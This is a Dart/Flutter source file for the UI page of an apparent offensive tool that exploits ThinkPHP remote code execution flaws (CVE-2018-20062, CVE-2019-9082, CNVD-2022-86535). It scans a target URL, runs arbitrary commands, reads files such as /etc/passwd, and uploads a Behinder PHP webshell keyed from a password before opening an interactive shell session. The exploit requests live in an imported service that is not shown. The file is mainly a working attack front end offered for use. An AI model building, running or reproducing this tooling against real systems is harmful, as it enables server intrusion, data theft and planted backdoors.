import 'dart:convert';

import 'package:crypto/crypto.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart' show rootBundle, Clipboard, ClipboardData;

import '../app/constants.dart';
import '../database/database_helper.dart';
import '../exp/thinkphp/thinkphp_exp_service.dart';
import '../models/project.dart';
import '../models/webshell.dart';
import '../theme/app_theme.dart';
import 'webshell_interactive_page.dart';

/// ThinkPHP 漏洞利用页面（100% 复现 ThinkphpGUI）
class ThinkphpExpPage extends StatelessWidget {
  const ThinkphpExpPage({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppColors.bgDark,
      appBar: AppBar(
        backgroundColor: AppColors.bgElevated,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back),
          onPressed: () => Navigator.of(context).pop(),
        ),
        title: Row(
          children: [
            const Icon(Icons.code, color: AppColors.primary),
            const SizedBox(width: 8),
            Text(
              'ThinkPHP CVE-2018-20062/CVE-2019-9082/CNVD-2022-86535',
              style: AppTextStyles.heading(size: 14, color: AppColors.primary),
            ),
          ],
        ),
      ),
      body: Padding(
        padding: const EdgeInsets.all(24),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
              decoration: BoxDecoration(
                color: AppColors.bgCard,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: AppColors.border),
                boxShadow: [
                  BoxShadow(
                    color: AppColors.primary.withValues(alpha: 0.06),
                    blurRadius: 12,
                    offset: const Offset(0, 2),
                  ),
                ],
              ),
              child: Row(
                children: [
                  Container(
                    width: 44,
                    height: 44,
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                        colors: [
                          AppColors.primary.withValues(alpha: 0.2),
                          AppColors.primary.withValues(alpha: 0.08),
                        ],
                      ),
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(
                        color: AppColors.primary.withValues(alpha: 0.4),
                        width: 1,
                      ),
                    ),
                    child: const Icon(Icons.php, color: AppColors.primary, size: 22),
                  ),
                  const SizedBox(width: 16),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          'ThinkPHP CVE-2018-20062/CVE-2019-9082/CNVD-2022-86535',
                          style: AppTextStyles.heading(
                            size: 14,
                            color: AppColors.textPrimary,
                          ),
                        ),
                        const SizedBox(height: 4),
                        Text(
                          '支持漏洞检测、命令执行、GetShell，100% 复现 ThinkphpGUI',
                          style: AppTextStyles.caption(
                            size: 12,
                            color: AppColors.textSecondary,
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 16),
            const Expanded(child: _ThinkphpExpCard()),
          ],
        ),
      ),
    );
  }
}

class _ThinkphpExpCard extends StatefulWidget {
  const _ThinkphpExpCard();

  @override
  State<_ThinkphpExpCard> createState() => _ThinkphpExpCardState();
}

class _ThinkphpExpCardState extends State<_ThinkphpExpCard> {
  final _urlController = TextEditingController();
  final _cmdController = TextEditingController();
  final _timeoutController = TextEditingController();
  final _passwordController = TextEditingController(
    text: AppConstants.defaultShellPassword,
  );
  final _logScrollController = ScrollController();

  String _log = '';
  bool _running = false;
  /// 检测到的所有 RCE 漏洞（用于下拉选择）
  List<ThinkphpVulnType> _detectedRceVulns = [];
  /// 当前选中的 RCE 漏洞（用于执行命令 / GetShell）
  ThinkphpVulnType? _selectedRceVuln;
  ThinkphpVulnType _selectedCheckType = ThinkphpVulnType.tp5023;

  void _appendLog(String line) {
    setState(() {
      final existing = _log.isEmpty ? <String>[] : _log.split('\n');
      existing.add(line);
      const maxLines = AppConstants.logBufferSize;
      final trimmed =
          existing.length > maxLines ? existing.sublist(existing.length - maxLines) : existing;
      _log = trimmed.join('\n');
    });
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (_logScrollController.hasClients) {
        _logScrollController.animateTo(
          _logScrollController.position.maxScrollExtent,
          duration: const Duration(milliseconds: 100),
          curve: Curves.easeOut,
        );
      }
    });
  }

  Future<void> _handleCheckSingle(ThinkphpVulnType type) async {
    final url = _urlController.text.trim();
    if (url.isEmpty) {
      _appendLog('[!] 请输入目标 URL');
      return;
    }
    setState(() => _running = true);
    _appendLog('[*] 检测 ${type.label}...');
    try {
      final svc = ThinkphpExpService(
        url: url,
        timeout: Duration(
          seconds: int.tryParse(_timeoutController.text.trim()) ??
              AppConstants.defaultHttpTimeoutSeconds,
        ),
      );
      final r = await svc.checkSingle(type);
      if (r.vulnerable) {
        _appendLog('[+] 存在漏洞: ${r.vulnName}');
        _appendLog('[i] ${r.detail}');
        setState(() {
          if (type.supportsRce) {
            _detectedRceVulns = [type];
            _selectedRceVuln = type;
          } else {
            _detectedRceVulns = [];
            _selectedRceVuln = null;
          }
        });
      } else {
        _appendLog('[-] 未检测到 ${r.vulnName}');
      }
    } catch (e) {
      _appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _handleCheckAllRce() async {
    final url = _urlController.text.trim();
    if (url.isEmpty) {
      _appendLog('[!] 请输入目标 URL');
      return;
    }
    setState(() => _running = true);
    _appendLog('[*] 批量检测全部 RCE 漏洞...');
    try {
      final svc = ThinkphpExpService(
        url: url,
        timeout: Duration(
          seconds: int.tryParse(_timeoutController.text.trim()) ??
              AppConstants.defaultHttpTimeoutSeconds,
        ),
      );
      const rceTypes = [
        ThinkphpVulnType.tp50,
        ThinkphpVulnType.tp5010,
        ThinkphpVulnType.tp5022_5129,
        ThinkphpVulnType.tp5023,
        ThinkphpVulnType.tp5023Debug,
        ThinkphpVulnType.tp5024_5130,
        ThinkphpVulnType.tp5ViewDisplay,
        ThinkphpVulnType.tp5MethodFilter,
        ThinkphpVulnType.tp5FileInclude,
        ThinkphpVulnType.tp3,
        ThinkphpVulnType.tp3Module,
        ThinkphpVulnType.tp3ModuleTypo,
        ThinkphpVulnType.tp3LogRce,
      ];
      final results = await svc.checkAllRce();
      final found = <ThinkphpVulnType>[];
      ThinkphpVulnType? firstHit;
      for (var i = 0; i < results.length; i++) {
        final r = results[i];
        if (r.vulnerable) {
          _appendLog('[+] ${r.vulnName}');
          _appendLog('[i] ${r.detail}');
          final t = rceTypes[i];
          found.add(t);
          firstHit ??= t;
        } else {
          _appendLog('[-] ${r.vulnName}');
        }
      }
      setState(() {
        _detectedRceVulns = found;
        _selectedRceVuln = found.isNotEmpty ? found.first : null;
        if (firstHit != null) _selectedCheckType = firstHit;
      });
      if (firstHit != null) {
        _appendLog('[*] 已自动选择首个命中漏洞: ${firstHit.label}');
      }
      if (found.isEmpty) _appendLog('[!] 未发现 RCE 漏洞');
    } catch (e) {
      _appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _handleCheckAll() async {
    final url = _urlController.text.trim();
    if (url.isEmpty) {
      _appendLog('[!] 请输入目标 URL');
      return;
    }
    setState(() => _running = true);
    _appendLog('[*] 批量检测全部漏洞...');
    try {
      final svc = ThinkphpExpService(
        url: url,
        timeout: Duration(
          seconds: int.tryParse(_timeoutController.text.trim()) ??
              AppConstants.defaultHttpTimeoutSeconds,
        ),
      );
      final results = await svc.checkAll();
      final found = <ThinkphpVulnType>[];
      ThinkphpVulnType? firstHit;
      for (var i = 0; i < results.length; i++) {
        final r = results[i];
        if (r.vulnerable) {
          _appendLog('[+] ${r.vulnName}');
          _appendLog('[i] ${r.detail}');
          final t = ThinkphpVulnType.values[i];
          firstHit ??= t;
          if (t.supportsRce) found.add(t);
        } else {
          _appendLog('[-] ${r.vulnName}');
        }
      }
      setState(() {
        _detectedRceVulns = found;
        _selectedRceVuln = found.isNotEmpty ? found.first : null;
        if (firstHit != null) _selectedCheckType = firstHit;
      });
      if (firstHit != null) {
        _appendLog('[*] 已自动选择首个命中漏洞: ${firstHit.label}');
      }
      if (found.isEmpty) _appendLog('[!] 未发现 RCE 漏洞');
    } catch (e) {
      _appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _handleExeRce() async {
    final url = _urlController.text.trim();
    final vuln = _selectedRceVuln;
    if (url.isEmpty) {
      _appendLog('[!] 请输入目标 URL');
      return;
    }
    if (vuln == null) {
      _appendLog('[!] 请先检测并选择要利用的 RCE 漏洞');
      return;
    }
    final defaultInput = vuln == ThinkphpVulnType.tp5FileInclude ? '/etc/passwd' : 'id';
    final cmd = _cmdController.text.trim().isEmpty ? defaultInput : _cmdController.text.trim();
    setState(() => _running = true);
    _appendLog(vuln == ThinkphpVulnType.tp5FileInclude
        ? '[*] 读取文件 ($vuln.label): $cmd'
        : '[*] 执行命令 ($vuln.label): $cmd');
    try {
      final svc = ThinkphpExpService(
        url: url,
        timeout: Duration(
          seconds: int.tryParse(_timeoutController.text.trim()) ??
              AppConstants.defaultHttpTimeoutSeconds,
        ),
      );
      final out = await svc.exeRce(vuln, cmd);
      if (out != null && out.isNotEmpty) {
        _appendLog(vuln == ThinkphpVulnType.tp5FileInclude ? '[+] 文件内容:\n$out' : '[+] 输出:\n$out');
      } else {
        _appendLog(vuln == ThinkphpVulnType.tp5FileInclude ? '[-] 读取失败或文件不存在' : '[-] 无输出或执行失败');
      }
    } catch (e) {
      _appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _handleGetShell() async {
    final url = _urlController.text.trim();
    if (url.isEmpty) {
      _appendLog('[!] 请输入目标 URL');
      return;
    }
    final vuln = _selectedRceVuln;
    if (vuln == null) {
      _appendLog('[!] 请先检测并选择要利用的 RCE 漏洞');
      return;
    }
    setState(() => _running = true);
    _appendLog('[*] 尝试 GetShell ($vuln.label)...');
    try {
      final password = _passwordController.text.trim().isEmpty
          ? AppConstants.defaultShellPassword
          : _passwordController.text.trim();
      var shellContent = await rootBundle.loadString('assets/defaults/payloads/php_behinder.php');
      final key = md5.convert(utf8.encode(password)).toString().substring(0, 16);
      shellContent = shellContent.replaceFirst(RegExp(r'\$key="[0-9a-f]{16}"'), '\$key="$key"');
      final svc = ThinkphpExpService(
        url: url,
        timeout: Duration(
          seconds: int.tryParse(_timeoutController.text.trim()) ??
              AppConstants.defaultHttpTimeoutSeconds,
        ),
      );
      final shellUrl = await svc.getShell(vuln, shellContent, password: password);
      if (shellUrl != null) {
        _appendLog('[+] GetShell 成功: $shellUrl');
        if (mounted) _openWebshellFromResult(context, shellUrl);
      } else {
        _appendLog('[-] GetShell 失败');
      }
    } catch (e) {
      _appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  /// 解析 GetShell 结果并跳转到 Webshell 交互页
  Future<void> _openWebshellFromResult(BuildContext context, String shellUrl) async {
    String url = shellUrl;
    String password = AppConstants.defaultShellPassword;
    final passIdx = shellUrl.indexOf(' Pass:');
    if (passIdx > 0) {
      url = shellUrl.substring(0, passIdx).trim();
      password = shellUrl.substring(passIdx + 6).trim();
    }
    final now = DateTime.now();
    Webshell ws = Webshell(
      id: 0,
      projectId: 0,
      name: 'ThinkPHP GetShell',
      url: url,
      password: password,
      type: 'php',
      method: 'POST',
      status: 1,
      connectorType: 'php_behinder',
      createdAt: now,
      updatedAt: now,
    );
    try {
      final db = DatabaseHelper();
      Project? project = await _showProjectPicker(context, db);
      if (project != null) {
        ws = await db.createWebshell(
          project.id,
          name: 'ThinkPHP GetShell',
          url: url,
          password: password,
          method: 'POST',
          type: 'php',
          connectorType: 'php_behinder',
        );
      }
    } catch (_) {}
    if (!mounted) return;
    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (_) => WebshellInteractivePage(webshell: ws),
      ),
    );
  }

  /// 弹出项目选择器；无项目时弹出创建对话框
  Future<Project?> _showProjectPicker(BuildContext context, DatabaseHelper db) async {
    final projects = await db.getAllProjects();
    if (projects.isEmpty) {
      return _showCreateProjectDialog(context, db);
    }
    return showDialog<Project>(
      context: context,
      builder: (ctx) => _ProjectPickerDialog(projects: projects),
    );
  }

  /// 创建项目对话框
  Future<Project?> _showCreateProjectDialog(BuildContext context, DatabaseHelper db) async {
    final nameController = TextEditingController();
    final domainController = TextEditingController();

    final ok = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        backgroundColor: AppColors.bgCard,
        title: Text('暂无项目', style: AppTextStyles.heading(color: AppColors.primary)),
        content: SizedBox(
          width: 360,
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              Text(
                '请先创建一个项目以保存 Webshell',
                style: AppTextStyles.caption(color: AppColors.textSecondary),
              ),
              const SizedBox(height: 16),
              TextField(
                controller: nameController,
                autofocus: true,
                style: const TextStyle(color: AppColors.textPrimary),
                decoration: InputDecoration(
                  labelText: '项目名称',
                  hintText: '例如：目标站点',
                  hintStyle: AppTextStyles.caption(size: 11, color: AppColors.textMuted),
                  labelStyle: const TextStyle(color: AppColors.textSecondary),
                  enabledBorder: OutlineInputBorder(
                    borderSide: BorderSide(color: AppColors.primary.withValues(alpha: 0.5)),
                  ),
                  focusedBorder: const OutlineInputBorder(
                    borderSide: BorderSide(color: AppColors.primary),
                  ),
                ),
              ),
              const SizedBox(height: 12),
              TextField(
                controller: domainController,
                style: const TextStyle(color: AppColors.textPrimary),
                decoration: InputDecoration(
                  labelText: '域名或ID *',
                  hintText: '例如：example.com',
                  hintStyle: AppTextStyles.caption(size: 11, color: AppColors.textMuted),
                  labelStyle: const TextStyle(color: AppColors.textSecondary),
                  enabledBorder: OutlineInputBorder(
                    borderSide: BorderSide(color: AppColors.primary.withValues(alpha: 0.5)),
                  ),
                  focusedBorder: const OutlineInputBorder(
                    borderSide: BorderSide(color: AppColors.primary),
                  ),
                ),
              ),
            ],
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx, false),
            child: Text('取消', style: AppTextStyles.body(color: AppColors.textSecondary)),
          ),
          FilledButton(
            onPressed: () {
              if (nameController.text.trim().isEmpty || domainController.text.trim().isEmpty) return;
              Navigator.pop(ctx, true);
            },
            style: FilledButton.styleFrom(backgroundColor: AppColors.primary),
            child: Text('创建', style: AppTextStyles.body(color: AppColors.bgDark)),
          ),
        ],
      ),
    );

    if (ok == true &&
        nameController.text.trim().isNotEmpty &&
        domainController.text.trim().isNotEmpty) {
      return db.createProject(
        nameController.text.trim(),
        domain: domainController.text.trim(),
      );
    }
    return null;
  }

  @override
  void dispose() {
    _urlController.dispose();
    _cmdController.dispose();
    _timeoutController.dispose();
    _passwordController.dispose();
    _logScrollController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        color: AppColors.bgCard,
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: AppColors.border),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: AppColors.primary.withValues(alpha: 0.12),
                  borderRadius: BorderRadius.circular(6),
                ),
                child: const Icon(Icons.code, color: AppColors.primary, size: 18),
              ),
              const SizedBox(width: 10),
              Text(
                'ThinkPHP 漏洞利用',
                style: AppTextStyles.heading(size: 14, color: AppColors.textPrimary),
              ),
              if (_selectedRceVuln != null) ...[
                const SizedBox(width: 12),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                  decoration: BoxDecoration(
                    color: AppColors.cyan.withValues(alpha: 0.2),
                    borderRadius: BorderRadius.circular(6),
                    border: Border.all(color: AppColors.cyan.withValues(alpha: 0.5)),
                  ),
                  child: Text(
                    '当前: ${_selectedRceVuln!.label}',
                    style: AppTextStyles.caption(size: 10, color: AppColors.cyan),
                  ),
                ),
              ],
            ],
          ),
          const SizedBox(height: 16),
          Expanded(
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.stretch,
              children: [
                Flexible(
                  flex: 1,
                  child: SingleChildScrollView(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        _sectionTitle('目标配置'),
                        TextField(
                          controller: _urlController,
                          style: AppTextStyles.body(size: 12, color: AppColors.textPrimary),
                          decoration: _inputDecoration('目标 URL', 'http://localhost:8080'),
                        ),
                        const SizedBox(height: 8),
                        Row(
                          children: [
                            Expanded(
                              child: TextField(
                                controller: _timeoutController,
                                style: AppTextStyles.body(size: 12, color: AppColors.textPrimary),
                                decoration: _inputDecoration('超时(s)', '10'),
                                keyboardType: TextInputType.number,
                              ),
                            ),
                          ],
                        ),
                        const SizedBox(height: 8),
                        TextField(
                          controller: _passwordController,
                          style: AppTextStyles.body(size: 12, color: AppColors.textPrimary),
                          decoration: _inputDecoration(
                            'GetShell 密码',
                            AppConstants.defaultShellPassword,
                          ),
                        ),
                        const SizedBox(height: 16),
                        _sectionTitle('漏洞检测'),
                        Row(
                          children: [
                            _actionBtn('检测全部RCE', _handleCheckAllRce),
                            const SizedBox(width: 8),
                            _actionBtn('检测全部', _handleCheckAll),
                          ],
                        ),
                        const SizedBox(height: 8),
                        Row(
                          children: [
                            Text('单漏洞:', style: AppTextStyles.caption(size: 11)),
                            const SizedBox(width: 8),
                            Expanded(
                              child: DropdownButtonFormField<ThinkphpVulnType>(
                                key: ValueKey(_selectedCheckType),
                                initialValue: _selectedCheckType,
                                isExpanded: true,
                                dropdownColor: AppColors.bgElevated,
                                style: AppTextStyles.body(size: 11, color: AppColors.textPrimary),
                                items: ThinkphpVulnType.values
                                    .map((t) => DropdownMenuItem(
                                          value: t,
                                          child: Text(t.label, overflow: TextOverflow.ellipsis),
                                        ))
                                    .toList(),
                                onChanged: _running ? null : (t) => t != null ? setState(() => _selectedCheckType = t) : null,
                                decoration: _inputDecoration('', ''),
                              ),
                            ),
                            const SizedBox(width: 8),
                            _actionBtn('检测', () => _handleCheckSingle(_selectedCheckType)),
                          ],
                        ),
                        const SizedBox(height: 16),
                        _sectionTitle('RCE 利用'),
                        if (_detectedRceVulns.isNotEmpty) ...[
                          Row(
                            children: [
                              Text('利用漏洞:', style: AppTextStyles.caption(size: 11)),
                              const SizedBox(width: 8),
                              Expanded(
                                child: DropdownButtonFormField<ThinkphpVulnType>(
                                  key: ValueKey('rce_${_selectedRceVuln?.name ?? "none"}'),
                                  initialValue: _selectedRceVuln,
                                  isExpanded: true,
                                  dropdownColor: AppColors.bgElevated,
                                  style: AppTextStyles.body(size: 11, color: AppColors.textPrimary),
                                  items: _detectedRceVulns
                                      .map((t) => DropdownMenuItem(
                                            value: t,
                                            child: Text(t.label, overflow: TextOverflow.ellipsis),
                                          ))
                                      .toList(),
                                  onChanged: _running
                                      ? null
                                      : (t) => t != null ? setState(() => _selectedRceVuln = t) : null,
                                  decoration: _inputDecoration('', ''),
                                ),
                              ),
                            ],
                          ),
                          const SizedBox(height: 8),
                        ],
                        TextField(
                          controller: _cmdController,
                          style: AppTextStyles.body(size: 12, color: AppColors.textPrimary),
                          decoration: _inputDecoration(
                            _selectedRceVuln == ThinkphpVulnType.tp5FileInclude ? '文件路径' : '命令',
                            _selectedRceVuln == ThinkphpVulnType.tp5FileInclude ? '/etc/passwd' : 'id',
                          ),
                        ),
                        const SizedBox(height: 8),
                        Row(
                          children: [
                            _actionBtn(
                              _selectedRceVuln == ThinkphpVulnType.tp5FileInclude ? '读取文件' : '执行命令',
                              _handleExeRce,
                              enabled: _selectedRceVuln != null,
                            ),
                            const SizedBox(width: 8),
                            _actionBtn(
                              'GetShell',
                              _handleGetShell,
                              enabled: _selectedRceVuln != null && _selectedRceVuln!.supportsGetShell,
                            ),
                          ],
                        ),
                      ],
                    ),
                  ),
                ),
                const SizedBox(width: 16),
                Flexible(
                  flex: 1,
                  child: Container(
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: AppColors.bgDark,
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: AppColors.border),
                    ),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.stretch,
                      children: [
                        Row(
                          children: [
                            Container(
                              width: 6,
                              height: 6,
                              margin: const EdgeInsets.only(right: 6),
                              decoration: BoxDecoration(
                                shape: BoxShape.circle,
                                color: _running ? AppColors.primary : AppColors.textMuted,
                              ),
                            ),
                            Text(
                              _running ? '运行中' : '空闲',
                              style: AppTextStyles.caption(
                                size: 11,
                                color: _running ? AppColors.primary : AppColors.textSecondary,
                              ),
                            ),
                            const Spacer(),
                            TextButton.icon(
                              onPressed: _log.isEmpty ? null : () async {
                                await Clipboard.setData(ClipboardData(text: _log));
                                if (mounted) {
                                  ScaffoldMessenger.of(context).showSnackBar(
                                    const SnackBar(content: Text('已复制到剪贴板'), duration: Duration(seconds: 1)),
                                  );
                                }
                              },
                              icon: const Icon(Icons.copy, size: 14),
                              label: const Text('复制'),
                              style: TextButton.styleFrom(
                                foregroundColor: AppColors.textSecondary,
                                textStyle: const TextStyle(fontSize: 11),
                              ),
                            ),
                            TextButton.icon(
                              onPressed: _log.isEmpty ? null : () => setState(() => _log = ''),
                              icon: const Icon(Icons.clear_all, size: 14),
                              label: const Text('清空'),
                              style: TextButton.styleFrom(
                                foregroundColor: AppColors.textSecondary,
                                textStyle: const TextStyle(fontSize: 11),
                              ),
                            ),
                          ],
                        ),
                        const Divider(height: 1, color: AppColors.border),
                        const SizedBox(height: 4),
                        Expanded(
                          child: SingleChildScrollView(
                            controller: _logScrollController,
                            child: SelectableText.rich(
                              _buildLogRichText(_log),
                              style: AppTextStyles.terminal(size: 12, color: AppColors.textMuted),
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _sectionTitle(String title) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 6),
      child: Row(
        children: [
          Container(
            width: 3,
            height: 14,
            decoration: BoxDecoration(
              color: AppColors.primary.withValues(alpha: 0.6),
              borderRadius: BorderRadius.circular(2),
            ),
          ),
          const SizedBox(width: 8),
          Text(title, style: AppTextStyles.heading(size: 12, color: AppColors.textSecondary)),
        ],
      ),
    );
  }

  InputDecoration _inputDecoration(String label, String hint) {
    return InputDecoration(
      labelText: label,
      hintText: hint,
      hintStyle: AppTextStyles.caption(size: 11, color: AppColors.textMuted),
      floatingLabelBehavior: FloatingLabelBehavior.always,
      isDense: true,
      contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
      border: OutlineInputBorder(borderRadius: BorderRadius.circular(8)),
      enabledBorder: OutlineInputBorder(
        borderRadius: BorderRadius.circular(8),
        borderSide: const BorderSide(color: AppColors.border),
      ),
      focusedBorder: OutlineInputBorder(
        borderRadius: BorderRadius.circular(8),
        borderSide: BorderSide(color: AppColors.primary.withValues(alpha: 0.6)),
      ),
    );
  }

  Widget _actionBtn(String label, VoidCallback onPressed, {bool enabled = true}) {
    return SizedBox(
      height: 32,
      child: ElevatedButton(
        onPressed: (_running || !enabled) ? null : onPressed,
        style: ElevatedButton.styleFrom(
          textStyle: const TextStyle(fontSize: 11),
          padding: const EdgeInsets.symmetric(horizontal: 12),
        ),
        child: Text(label),
      ),
    );
  }

  /// 根据日志前缀返回颜色，凸显关键信息
  Color _logLineColor(String line) {
    if (line.startsWith('[+]')) return AppColors.primary; // 成功 - 高亮绿
    if (line.startsWith('[!]')) return AppColors.red;     // 错误/警告 - 红色
    if (line.startsWith('[-]')) return AppColors.textMuted; // 失败 - 灰色
    if (line.startsWith('[*]')) return AppColors.cyan;    // 进行中 - 青色
    if (line.startsWith('[i]')) return AppColors.cyan.withValues(alpha: 0.9); // 信息 - 浅青
    return AppColors.textSecondary;
  }

  TextSpan _buildLogRichText(String log) {
    if (log.isEmpty) {
      return TextSpan(text: '> 等待操作', style: TextStyle(color: AppColors.textMuted, fontFamily: 'Monaco'));
    }
    final lines = log.split('\n');
    final spans = <TextSpan>[];
    final baseStyle = AppTextStyles.terminal(size: 12, color: AppColors.textSecondary);
    for (var i = 0; i < lines.length; i++) {
      final line = lines[i];
      final color = _logLineColor(line);
      spans.add(TextSpan(
        text: line + (i < lines.length - 1 ? '\n' : ''),
        style: baseStyle.copyWith(color: color, fontWeight: line.startsWith('[+]') || line.startsWith('[!]') ? FontWeight.w600 : null),
      ));
    }
    return TextSpan(children: spans);
  }
}

/// 项目选择器对话框
class _ProjectPickerDialog extends StatelessWidget {
  final List<Project> projects;

  const _ProjectPickerDialog({required this.projects});

  @override
  Widget build(BuildContext context) {
    return AlertDialog(
      backgroundColor: AppColors.bgCard,
      title: Text('选择项目', style: AppTextStyles.heading(color: AppColors.primary)),
      content: SizedBox(
        width: 360,
        child: ListView.builder(
          shrinkWrap: true,
          itemCount: projects.length,
          itemBuilder: (ctx, i) {
            final p = projects[i];
            return ListTile(
              leading: const Icon(Icons.folder_outlined, color: AppColors.primary, size: 20),
              title: Text(p.name, style: AppTextStyles.body(size: 13, color: AppColors.textPrimary)),
              subtitle: Text(p.domain, style: AppTextStyles.caption(size: 11, color: AppColors.textMuted)),
              onTap: () => Navigator.pop(context, p),
            );
          },
        ),
      ),
      actions: [
        TextButton(
          onPressed: () => Navigator.pop(context),
          child: Text('取消', style: AppTextStyles.body(color: AppColors.textSecondary)),
        ),
      ],
    );
  }
}
